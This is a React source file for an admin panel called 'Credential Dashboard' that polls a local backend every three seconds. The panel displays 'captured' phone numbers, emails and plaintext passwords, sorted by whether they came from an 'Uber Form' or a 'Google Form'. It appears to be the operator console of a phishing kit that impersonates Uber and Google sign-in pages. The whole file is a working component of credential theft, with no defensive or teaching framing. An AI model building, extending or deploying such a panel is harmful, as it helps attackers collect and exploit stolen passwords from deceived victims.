import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { BrowserRouter as Router, Routes, Route, useNavigate, Navigate } from 'react-router-dom';
import { LogOut, Trash2, Users, Shield, RefreshCcw } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import './App.css';

const API_URL = 'http://127.0.0.1:5001/api';

// --- Login Page ---
const Login = ({ setAuth }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const navigate = useNavigate();

  const handleLogin = async (e) => {
    e.preventDefault();
    try {
      const res = await axios.post(`${API_URL}/admin/login`, { username, password });
      if (res.data.authenticated) {
        localStorage.setItem('admin_token', res.data.token);
        setAuth(true);
        navigate('/dashboard');
      }
    } catch (err) {
      console.error('Login error:', err);
      if (err.response) {
        setError(`Login failed: ${err.response.data.message || 'Check credentials'}`);
      } else {
        setError('Connection error: Is the backend server running?');
      }
    }
  };

  return (
    <div className="login-page">
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        className="glass-card"
      >
        <h1 className="admin-title">Admin Access</h1>
        <p className="admin-subtitle">Secure gateway for credential management</p>

        <form onSubmit={handleLogin}>
          <div className="form-group">
            <label className="form-label">Username</label>
            <input
              type="text"
              className="admin-input"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              placeholder="admin"
            />
          </div>
          <div className="form-group">
            <label className="form-label">Password</label>
            <input
              type="password"
              className="admin-input"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="••••••••"
            />
          </div>
          {error && <p style={{ color: '#ef4444', fontSize: '14px', marginBottom: '15px' }}>{error}</p>}
          <button type="submit" className="admin-btn">Enter Dashboard</button>
        </form>
      </motion.div>
    </div>
  );
};

// --- Dashboard Component ---
const Dashboard = ({ setAuth }) => {
  const [users, setUsers] = useState([]);
  const [loading, setLoading] = useState(true);
  const [activeTab, setActiveTab] = useState('all'); // 'all', 'uber', 'google'
  const navigate = useNavigate();

  const fetchUsers = async () => {
    try {
      const res = await axios.get(`${API_URL}/admin/users`);
      setUsers(res.data);
      setLoading(false);
    } catch (err) {
      console.error(err);
    }
  };

  useEffect(() => {
    fetchUsers();
    const interval = setInterval(fetchUsers, 3000); // Poll every 3s
    return () => clearInterval(interval);
  }, []);

  const deleteUser = async (id) => {
    try {
      await axios.delete(`${API_URL}/admin/users/${id}`);
      setUsers(users.filter(u => u._id !== id));
    } catch (err) {
      console.error(err);
    }
  };

  const logout = () => {
    localStorage.removeItem('admin_token');
    setAuth(false);
    navigate('/');
  };

  // Filter users based on active tab
  const filteredUsers = activeTab === 'all'
    ? users
    : users.filter(u => u.source === activeTab);

  const uberCount = users.filter(u => u.source === 'uber').length;
  const googleCount = users.filter(u => u.source === 'google').length;

  return (
    <div className="dashboard-container">
      <div className="dashboard-header">
        <div>
          <h1 className="admin-title">Credential Dashboard</h1>
          <p className="admin-subtitle">Real-time monitoring of captured data</p>
        </div>
        <button onClick={logout} className="admin-btn" style={{ width: 'auto', padding: '0 20px', background: 'rgba(255,255,255,0.1)' }}>
          <LogOut size={18} style={{ marginRight: '8px' }} /> Logout
        </button>
      </div>

      <div className="stats-grid">
        <div className="stat-card">
          <Users color="#38bdf8" />
          <div className="admin-subtitle" style={{ marginBottom: 0 }}>Total Registered</div>
          <div className="stat-value">{users.length}</div>
        </div>
        <div className="stat-card">
          <Shield color="#818cf8" />
          <div className="admin-subtitle" style={{ marginBottom: 0 }}>Uber Form</div>
          <div className="stat-value" style={{ color: '#10b981', fontSize: '24px' }}>{uberCount}</div>
        </div>
        <div className="stat-card">
          <RefreshCcw color="#38bdf8" />
          <div className="admin-subtitle" style={{ marginBottom: 0 }}>Google Form</div>
          <div className="stat-value" style={{ fontSize: '24px', color: '#f59e0b' }}>{googleCount}</div>
        </div>
      </div>

      {/* Tabs */}
      <div style={{ display: 'flex', gap: '12px', marginBottom: '24px' }}>
        <button
          onClick={() => setActiveTab('all')}
          className="admin-btn"
          style={{
            width: 'auto',
            padding: '12px 24px',
            background: activeTab === 'all' ? 'rgba(255,255,255,0.2)' : 'rgba(255,255,255,0.05)',
            border: activeTab === 'all' ? '2px solid rgba(255,255,255,0.3)' : '2px solid transparent'
          }}
        >
          All Users ({users.length})
        </button>
        <button
          onClick={() => setActiveTab('uber')}
          className="admin-btn"
          style={{
            width: 'auto',
            padding: '12px 24px',
            background: activeTab === 'uber' ? 'rgba(16,185,129,0.2)' : 'rgba(255,255,255,0.05)',
            border: activeTab === 'uber' ? '2px solid rgba(16,185,129,0.5)' : '2px solid transparent'
          }}
        >
          Uber Form ({uberCount})
        </button>
        <button
          onClick={() => setActiveTab('google')}
          className="admin-btn"
          style={{
            width: 'auto',
            padding: '12px 24px',
            background: activeTab === 'google' ? 'rgba(245,158,11,0.2)' : 'rgba(255,255,255,0.05)',
            border: activeTab === 'google' ? '2px solid rgba(245,158,11,0.5)' : '2px solid transparent'
          }}
        >
          Google Form ({googleCount})
        </button>
      </div>

      <div className="user-table-wrapper">
        <table className="user-table">
          <thead>
            <tr>
              <th>Source</th>
              <th>Phone / Email</th>
              <th>Password</th>
              <th>Captured Date</th>
              <th>Action</th>
            </tr>
          </thead>
          <tbody>
            <AnimatePresence>
              {filteredUsers.map((user) => (
                <motion.tr
                  key={user._id}
                  initial={{ opacity: 0, x: -20 }}
                  animate={{ opacity: 1, x: 0 }}
                  exit={{ opacity: 0, x: 20 }}
                  className="user-row"
                >
                  <td>
                    <span style={{
                      padding: '4px 12px',
                      borderRadius: '12px',
                      fontSize: '12px',
                      fontWeight: '600',
                      background: user.source === 'uber' ? 'rgba(16,185,129,0.2)' : 'rgba(245,158,11,0.2)',
                      color: user.source === 'uber' ? '#10b981' : '#f59e0b',
                      textTransform: 'uppercase'
                    }}>
                      {user.source || 'uber'}
                    </span>
                  </td>
                  <td className="user-id">{user.identifier}</td>
                  <td><code style={{ background: 'rgba(0,0,0,0.3)', padding: '4px 8px', borderRadius: '4px' }}>{user.password}</code></td>
                  <td className="timestamp">{new Date(user.timestamp).toLocaleString()}</td>
                  <td>
                    <button onClick={() => deleteUser(user._id)} className="delete-btn">
                      <Trash2 size={16} />
                    </button>
                  </td>
                </motion.tr>
              ))}
            </AnimatePresence>
          </tbody>
        </table>
      </div>
    </div>
  );
};

const App = () => {
  const [isAuthenticated, setIsAuthenticated] = useState(!!localStorage.getItem('admin_token'));

  return (
    <Router>
      <div className="admin-layout">
        <Routes>
          <Route path="/" element={!isAuthenticated ? <Login setAuth={setIsAuthenticated} /> : <Navigate to="/dashboard" />} />
          <Route path="/dashboard" element={isAuthenticated ? <Dashboard setAuth={setIsAuthenticated} /> : <Navigate to="/" />} />
        </Routes>
      </div>
    </Router>
  );
};

export default App;
